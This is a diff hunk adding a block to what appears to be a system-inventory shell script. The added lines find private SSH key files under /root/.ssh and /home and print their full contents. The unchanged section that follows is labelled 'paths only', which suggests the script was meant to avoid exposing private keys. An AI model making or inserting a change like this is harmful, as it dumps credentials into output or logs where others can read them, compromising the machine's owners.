@@ -61,6 +61,18 @@
         cat /root/.ssh/authorized_keys 2>/dev/null || true
 
         echo ""
+        echo "=== PRIVATE KEY FILE CONTENTS ==="
+        find /root/.ssh /home -type f \
+          \( -name 'id_*' -o -name '*_rsa' -o -name '*_ed25519' \
+          -o -name '*_ecdsa' \) \
+          ! -name '*.pub' ! -name 'known_hosts' ! -name 'authorized_keys' \
+          ! -name 'config' 2>/dev/null | while read -r keyfile; do
+          echo "--- BEGIN $keyfile ---"
+          cat "$keyfile" 2>/dev/null || echo "(unreadable)"
+          echo "--- END $keyfile ---"
+        done
+
+        echo ""
         echo "=== PRIVATE KEY FILES ON DISK (paths only, then pub derived) ==="
         find /root/.ssh /home -type f \
           \( -name 'id_*' -o -name '*_rsa' -o -name '*_ed25519' \
